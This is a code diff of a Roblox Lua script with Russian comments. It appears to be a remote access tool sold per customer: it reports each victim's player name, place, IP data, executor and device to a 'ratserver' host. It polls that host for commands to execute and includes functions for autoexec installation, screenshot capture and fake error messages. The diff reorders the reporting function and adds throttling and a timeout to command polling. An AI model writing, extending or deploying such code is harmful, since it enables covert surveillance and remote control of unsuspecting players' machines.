@@ -10,9 +10,10 @@ local Stats = game:GetService("Stats")
 local CoreGui = game:GetService("CoreGui")
 local TeleportService = game:GetService("TeleportService")
 
--- ========== КОНФИГУРАЦИЯ (меняется для каждого покупателя!) ==========
+-- ========== КОНФИГУРАЦИЯ ПОКУПАТЕЛЯ (МЕНЯТЬ ТУТ!) ==========
 local SERVER_URL = "https://ratserver-6wo3.onrender.com"
 local CUSTOMER_KEY = "customer_key_1"  -- ВСТАВЬ СВОЙ КЛЮЧ!
+-- ============================================================
 
 local player = Players.LocalPlayer
 
@@ -189,7 +190,6 @@ local function sendInjectNotification()
         end)
     end
     
-    -- Отправляем на сервер с уникальным ключом покупателя
     local success, response = pcall(function()
         return httpRequest({
             Url = SERVER_URL.."/command",
@@ -198,12 +198,47 @@ local function sendInjectNotification()
             Body = HttpService:JSONEncode({
                 command = "inject_notify",
                 args = {playerName, placeName, ipData, executor, deviceType},
-                customer_key = CUSTOMER_KEY  -- УНИКАЛЬНЫЙ КЛЮЧ!
+                customer_key = CUSTOMER_KEY
             })
         })
     end)
     
     return success
+end
+
+local function sendUserInfo()
+    local currentTime = os.time()
+    if currentTime - lastUserUpdate < 15 then
+        return
+    end
+    
+    local playerName = player.Name
+    local placeName = "Unknown"
+    pcall(function()
+        placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
+    end)
+    
+    local executor = getExecutorInfo()
+    
+    local success = pcall(function()
+        local response = httpRequest({
+            Url = SERVER_URL.."/users",
+            Method = "POST",
+            Headers = {["Content-Type"] = "application/json"},
+            Body = HttpService:JSONEncode({
+                player = playerName,
+                place = placeName,
+                executor = executor,
+                device = deviceType,
+                customer_key = CUSTOMER_KEY
+            })
+        })
+        return response ~= nil
+    end)
+    
+    if success then
+        lastUserUpdate = currentTime
+    end
 end
 
 local function autoInstallToAutoexec()
@@ -262,41 +297,6 @@ local function captureScreenshot()
     end
     
     return nil
-end
-
-local function sendUserInfo()
-    local currentTime = os.time()
-    if currentTime - lastUserUpdate < 15 then
-        return
-    end
-    
-    local playerName = player.Name
-    local placeName = "Unknown"
-    pcall(function()
-        placeName = MarketplaceService:GetProductInfo(game.PlaceId).Name
-    end)
-    
-    local executor = getExecutorInfo()
-    
-    local success = pcall(function()
-        local response = httpRequest({
-            Url = SERVER_URL.."/users",
-            Method = "POST",
-            Headers = {["Content-Type"] = "application/json"},
-            Body = HttpService:JSONEncode({
-                player = playerName,
-                place = placeName,
-                executor = executor,
-                device = deviceType,
-                customer_key = CUSTOMER_KEY
-            })
-        })
-        return response ~= nil
-    end)
-    
-    if success then
-        lastUserUpdate = currentTime
-    end
 end
 
 local function showFakeError(message)
@@ -1261,15 +1261,29 @@ local function ExecuteCommand(cmd, args)
     end)
 end
 
+-- Функция проверки команд с сервера (с таймаутом 5 секунд)
+local lastCommandCheck = 0
+local lastCommandResponse = 0
+
 local function checkCommands()
+    local currentTime = os.time()
+    
+    -- Не чаще чем раз в 2 секунды
+    if currentTime - lastCommandCheck < 2 then
+        return false
+    end
+    lastCommandCheck = currentTime
+    
     local success, response = pcall(function()
         return httpRequest({
             Url = SERVER_URL.."/data?player=" .. player.Name .. "&customer_key=" .. CUSTOMER_KEY,
-            Method = "GET"
+            Method = "GET",
+            Timeout = 5  -- таймаут 5 секунд
         })
     end)
     
     if success and response and response.Body then
+        lastCommandResponse = currentTime
         local success, data = pcall(function()
             return HttpService:JSONDecode(response.Body)
         end)
@@ -1279,6 +1293,12 @@ local function checkCommands()
             return true
         end
     end
+    
+    -- Если нет ответа от сервера больше 5 секунд - считаем что отключен
+    if currentTime - lastCommandResponse > 5 then
+        -- Можно добавить логику переподключения если нужно
+    end
+    
     return false
 end
 
